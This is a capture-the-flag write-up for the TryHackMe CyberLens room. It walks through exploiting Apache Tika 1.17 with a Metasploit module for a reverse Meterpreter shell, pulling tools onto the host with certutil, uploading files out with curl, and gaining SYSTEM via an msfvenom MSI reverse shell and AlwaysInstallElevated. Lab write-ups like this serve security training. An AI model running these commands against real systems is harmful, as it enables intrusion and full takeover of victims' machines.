# TryHackMe - CyberLens CTF write-up

Challenge Description
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags? 

Room: https://tryhackme.com/room/cyberlensp6

## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution:  
[https://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/CyberLens.md)

## Initial setup

Add the host file name

```bash
sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts
```

Typically when THM asks for a host file name to be added there is a subdomain / vhost, checking this straight of and found none , we had to add fs to filter out response sizes for the non existing page response  from the web server. no results,

```bash
root@ip-10-48-104-251:~# ffuf -u http://cyberlens.thm -H "Host: FUZZ.cyberlens.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8780

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cyberlens.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cyberlens.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 8780
________________________________________________

:: Progress: [4997/4997] :: Job [1/1] :: 4071 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

- We tried some gobuster emulation but not much found 
- We start a nmap, results came after we found with other means below, 

```bash
nmap -p- -sV cyberlens.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-02 03:00 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for cyberlens.thm (10.48.178.51)
Host is up (0.00044s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 391.40 seconds
```

## Web enumeration

While nmap is going we start poking around on http://cyberlens.thm, see there is a upload file, testing with a image it returns metadata.

Using browser developer tools, network tab shows the page post to the following port, so much be another web server

```text
http://cyberlens.thm:61777/meta
```

- loading http://cyberlens.thm:61777 we see "Welcome to the Apache Tika 1.17 Server" which has a list of API endpoints
- Could not see an obvious exploitable endpoint, searched Tika within exploit db and found a few but none looked to work
- Fired up metaspliot and found a promising exploit which did connect

```bash
root@ip-10-48-104-251:~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: Display the Framework log using the log command, learn 
more with help log

                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.4.55-dev-                         ]
+ -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]
+ -- --=[ 1616 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

search Tika
msf6 > search Tika

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript         2018-04-25       excellent  Yes    Apache Tika Header Command Injection
   1  post/linux/gather/puppet                             .                normal     No     Puppet Config Gather
   2  auxiliary/scanner/http/wp_gimedia_library_file_read  .                normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/wp_gimedia_library_file_read

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/apache_tika_jp2_jscript) > show options

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      9998             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to l
                                       isten on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.48.104.251    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RHOST cyberlens.thm
RHOST => cyberlens.thm
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
RPORT => 61777
msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit
[*] Started reverse TCP handler on 10.48.104.251:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.48.178.51:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (177734 bytes) to 10.48.178.51
[*] Meterpreter session 1 opened (10.48.104.251:4444 -> 10.48.178.51:49810) at 2026-04-02 03:09:30 +0100
```

## Obtaining user flag

```bash
meterpreter > shell
Process 4408 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users

06/06/2023  07:48 PM    <DIR>          .
06/06/2023  07:48 PM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          Administrator
11/25/2023  07:31 AM    <DIR>          CyberLens
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  14,948,204,544 bytes free

c:\Users>cd CyberLens
cd CyberLens

c:\Users\CyberLens>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\CyberLens

11/25/2023  07:31 AM    <DIR>          .
11/25/2023  07:31 AM    <DIR>          ..
06/06/2023  07:48 PM    <DIR>          3D Objects
06/06/2023  07:48 PM    <DIR>          Contacts
06/06/2023  07:53 PM    <DIR>          Desktop
06/07/2023  03:09 AM    <DIR>          Documents
06/06/2023  07:48 PM    <DIR>          Downloads
06/06/2023  07:48 PM    <DIR>          Favorites
06/06/2023  07:48 PM    <DIR>          Links
06/06/2023  07:48 PM    <DIR>          Music
06/06/2023  07:48 PM    <DIR>          Pictures
06/06/2023  07:48 PM    <DIR>          Saved Games
06/06/2023  07:48 PM    <DIR>          Searches
06/06/2023  07:48 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,948,204,544 bytes free

c:\Users\CyberLens>cd Desktop
cd Desktop

c:\Users\CyberLens\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,948,204,544 bytes free

c:\Users\CyberLens\Desktop>type user.txt
type user.txt
THM{xxxxxxxxxxx}
```

## Privilege escalation

Checking if we can use WinPEAS C# .exe project as .Net >= 4.5.2 required, confirmed we can as 4.8 is installed.

```bash
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full
    Release    REG_DWORD    0x80eb1
```

Downloading to attackbox

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20260401-173292e1/winPEASx64.exe
```

Hosting file

```bash
 python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.178.51 - - [02/Apr/2026 03:17:36] "GET /winPEASx64.exe HTTP/1.1" 200 -
10.48.178.51 - - [02/Apr/2026 03:17:37] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

downloading winpeas from our hosting

```bash
certutil -urlcache -f http://10.48.104.251:8000/winPEASx64.exe winpeas.exe
```

Running

```bash
winpeas.exe > report.txt 
```

Hosting a upload server to easy upload report for review externally,

```python
from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return "no file field", 400

    f = request.files["file"]
    if f.filename == "":
        return "empty filename", 400

    path = os.path.join(UPLOAD_DIR, f.filename)
    f.save(path)
    return f"saved to {path}\n", 200

app.run(host="0.0.0.0", port=5000)
```

Running note python3.9 is required to run,

```bash
root@ip-10-48-104-251:~# nano server.py
root@ip-10-48-104-251:~# python3.9 server.py 
 * Serving Flask app 'server' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://127.0.0.1:5000
 * Running on http://10.48.104.251:5000 (Press CTRL+C to quit)
```

Uploading report from compromised windows machine

```bash
c:\Users\CyberLens\Downloads>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\CyberLens\Downloads> curl.exe -F "file=@C:\Users\CyberLens\Downloads\report.txt" http://10.48.104.251:5000/upload
curl.exe -F "file=@C:\Users\CyberLens\Downloads\report.txt" http://10.48.104.251:5000/upload
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  144k  100    28  100  144k     28   144k  0:00:01 --:--:--  0:00:01  141M
saved to uploads/report.txt
```

In the report we see

```text
[1;36mÉÍÍÍÍÍÍÍÍÍÍ¹ [1;32mChecking AlwaysInstallElevated [1;90m(T1548.002)[0m[0m
[1;36mÈ [1;34m [1;33mhttps://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated[0m
[1;31m    AlwaysInstallElevated set to 1 in HKLM![0m
[1;31m    AlwaysInstallElevated set to 1 in HKCU![0m
```

This means is MSI is installed by system, few ways we can go here but easy to just create a msfvenom MSI and create a reverse privileged shell

```bash
root@ip-10-48-104-251:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.104.251 LPORT=4444 -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
```

Simple NetCat listner

```bash
nc -lvnp 4444
```

If we place the msi within where we hosted winpeas easy to download,

```bash
PS C:\Users\CyberLens\Downloads> 
iwr http://10.48.104.251:8000/shell.msi -OutFile shell.msi
PS C:\Users\CyberLens\Downloads> ls
ls


    Directory: C:\Users\CyberLens\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/2/2026   2:21 AM         147643 report.txt                                                            
-a----         4/2/2026   2:36 AM         159744 shell.msi                                                       

-a----         4/2/2026   2:17 AM       11115520 winpeas.exe 
```

Execution of MSI

```bash
msiexec /quiet /qn /i shell.msi
```

and if all is done correct, we should be system on our new reverse shell

```bash
root@ip-10-48-104-251:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.178.51 50031
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:/users/administrator
cd c:/users/administrator

c:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\Administrator

04/02/2026  02:02 AM    <DIR>          .
04/02/2026  02:02 AM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          3D Objects
03/17/2021  03:13 PM    <DIR>          Contacts
06/06/2023  07:45 PM    <DIR>          Desktop
03/17/2021  03:13 PM    <DIR>          Documents
06/06/2023  07:39 PM    <DIR>          Downloads
03/17/2021  03:13 PM    <DIR>          Favorites
03/17/2021  03:13 PM    <DIR>          Links
03/17/2021  03:13 PM    <DIR>          Music
03/17/2021  03:13 PM    <DIR>          Pictures
03/17/2021  03:13 PM    <DIR>          Saved Games
03/17/2021  03:13 PM    <DIR>          Searches
03/17/2021  03:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,904,344,576 bytes free

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,904,344,576 bytes free

c:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{xxxxxxxxxxx}
```
